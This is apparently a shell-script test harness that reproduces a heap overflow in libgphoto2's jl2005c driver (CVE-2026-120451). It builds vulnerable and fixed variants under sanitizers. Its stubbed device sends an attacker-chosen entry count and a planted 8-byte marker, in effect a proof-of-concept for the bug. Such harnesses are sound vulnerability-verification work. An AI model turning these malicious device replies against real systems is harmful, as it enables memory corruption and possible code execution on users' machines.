#!/bin/sh
# libgphoto2shell direct-call harness (CVE-2026-120451, gphoto issue #1326).
# Verbatim pinned v2.5.34 jl2005c.h / jl2005c.c and fixed-commit jl2005c.c are
# included under #line control. Everything else is a declared stub: gphoto2
# port API, device replies, struct allocation and the driver. No libgphoto2
# build, USB, gvfs, camera, socket or wire.
set -eu
HERE=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
PINS=$(CDPATH= cd -- "$HERE/../pins" && pwd)
mkdir -p "$HERE/evidence"

gen_header() { # verbatim pinned header, #line-tagged for diagnostics
    { printf '#line 1 "jl2005c.h.vuln"\n'; cat "$PINS/jl2005c.h.vuln"; } \
        > "$HERE/jl2005c.h"
}
gen_header

gen_driver() { # variant vuln|fixed
    v=$1
    if [ "$v" = vuln ]; then src="$PINS/jl2005c.c.vuln"; tag=jl2005c.c.vuln
    else                    src="$PINS/jl2005c.c.fixed"; tag=jl2005c.c.fixed
    fi
    out="$HERE/driver-$v.c"
    {
        cat <<'HEADER'

/* Generated by harness/run.sh. Pinned upstream bytes are under #line;
   everything else is declared stub/driver code. Do not edit by hand. */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "config.h"
#include "gphoto2/gphoto2.h"
#include "gphoto2/gphoto2-port.h"
#include "libgphoto2/gphoto2-endian.h"

/* The pinned source calls usleep many times; the lab has no device timing. */
int usleep(unsigned int usec) { (void)usec; return 0; }

/* --- declared stub: emulated JL2005 device replies ------------------- */
static unsigned int g_count = 100;      /* device bytes 12/13 */
static int g_short_read = 0;            /* scenario heap: device sends fewer bytes */
static long g_rip_dev_off = -1;         /* device offset for chosen 8-byte marker */
static unsigned char g_marker[8] = {0x41,0x42,0x43,0x44,0x45,0x46,0x47,0x48};
static int g_seq1 = 0, g_table_seen = 0, g_big_seen = 0, g_big_n = 0;
static CameraPrivateLibrary *g_priv = NULL;

int gp_port_write(GPPort *port, const char *data, int size) {
    (void)port; (void)data; (void)size; return GP_OK;
}
int gp_port_get_settings(GPPort *port, GPPortSettings *s) {
    (void)port; s->usb.inep = 0; return GP_OK;
}
int gp_port_set_settings(GPPort *port, GPPortSettings s) {
    (void)port; (void)s; return GP_OK;
}
int gp_port_close(GPPort *port) { (void)port; return GP_OK; }
int gp_port_open(GPPort *port) { (void)port; return GP_OK; }

int gp_port_read(GPPort *port, char *data, int size) {
    (void)port;
    if (size == 1) { data[0] = 0; ++g_seq1; return 1; }
    if (size == 0x200) {
        /* First allocation-table block: magic checked at pinned :123,
           model at :6, attacker-supplied entry count at :12/:13. */
        memset(data, 0x5a, (size_t)size);
        memcpy(data, "JL2005", 6);
        data[6] = 0x43;                         /* model C -> blocksize 0x200 */
        data[12] = (char)((g_count >> 8) & 0xff);
        data[13] = (char)(g_count & 0xff);
        g_table_seen = 1;
        return size;
    }
    /* Follow-up read: its length is alloc_table_size - 0x200, from the
       device-supplied count. Content is device-supplied and chosen. */
    int n = size;
    if (g_short_read && n > 0x3E20) n = 0x3E20; /* short device reply */
    memset(data, 0x5a, (size_t)n);
    if (g_rip_dev_off >= 0 && g_rip_dev_off + 8 <= n)
        memcpy(data + g_rip_dev_off, g_marker, 8);
    ++g_big_seen; g_big_n = n;
    return n;
}

HEADER
        printf '\n#line 1 "%s"\n' "$tag"
        cat "$src"
        cat <<'TAIL'

/* #line reset: only the two pinned files above are upstream bytes. */
#line 1 "driver-tail.c"

int main(int argc, char **argv) {
    const char *sc = argc > 1 ? argv[1] : "baseline";
    if (!strcmp(sc, "baseline"))       g_count = 100;
    else if (!strcmp(sc, "attack"))    g_count = 1022;
    else if (!strcmp(sc, "max"))       g_count = 65535;
    else if (!strcmp(sc, "heap"))     { g_count = 1022; g_short_read = 1; }
    else { fprintf(stderr, "unknown scenario %s\n", sc); return 2; }
    if (argc > 2) g_rip_dev_off = strtol(argv[2], NULL, 0);

    Camera cam; memset(&cam, 0, sizeof cam);
    GPPort port; memset(&port, 0, sizeof port);
    cam.port = &port;

    /* priv->table is the last struct member. Plain builds append a canary
       so chosen bytes can be read after it; ASan builds use the real size. */
    size_t alloc = sizeof(CameraPrivateLibrary);
#ifndef ASAN_BUILD
    alloc += 16384;
#endif
    CameraPrivateLibrary *priv = (CameraPrivateLibrary *)calloc(1, alloc);
    g_priv = priv;
    if (!priv) return 2;
#ifndef ASAN_BUILD
    memset((unsigned char *)priv + sizeof(CameraPrivateLibrary), 0xa5, 16384);
#endif
    int rc = jl2005c_init(&cam, &port, priv);
    printf("scenario=%s variant=%s count=%u rc=%d table_seen=%d big_seen=%d big_n=%d seq1=%d\n",
        sc,
#if VULN_BUILD
        "vuln",
#else
        "fixed",
#endif
        g_count, rc, g_table_seen, g_big_seen, g_big_n, g_seq1);
#ifndef ASAN_BUILD
    unsigned char *tail = (unsigned char *)priv + sizeof(CameraPrivateLibrary);
    printf("heap_tail=%02x %02x %02x %02x\n", tail[0], tail[1], tail[2], tail[3]);
#endif
    free(priv);
    return 0;
}
TAIL
    } > "$out"
}

gen_driver vuln
gen_driver fixed

build() { # cc variant mode
    cc=$1; v=$2; mode=$3
    defs="-DVULN_BUILD=$([ "$v" = vuln ] && echo 1 || echo 0)"
    if [ "$mode" = asan ] || [ "$mode" = recover ]; then
        defs="$defs -DASAN_BUILD=1 -fsanitize=address"
    fi
    # Recover mode lets both memmove range checks report: default ASan aborts
    # on the source over-read before the heap destination check runs.
    if [ "$mode" = recover ]; then
        defs="$defs -fsanitize-recover=address"
    fi
    # shellcheck disable=SC2086
    "$cc" -O0 -g -fno-omit-frame-pointer -std=gnu11 $defs \
        -I "$HERE/stubs" "$HERE/driver-$v.c" -o "$HERE/$cc-$v-$mode" -lm
}

for cc in gcc clang; do
    for v in vuln fixed; do
        for mode in plain asan recover; do
            build "$cc" "$v" "$mode"
        done
    done
done
printf 'built 12 binaries in %s\n' "$HERE"
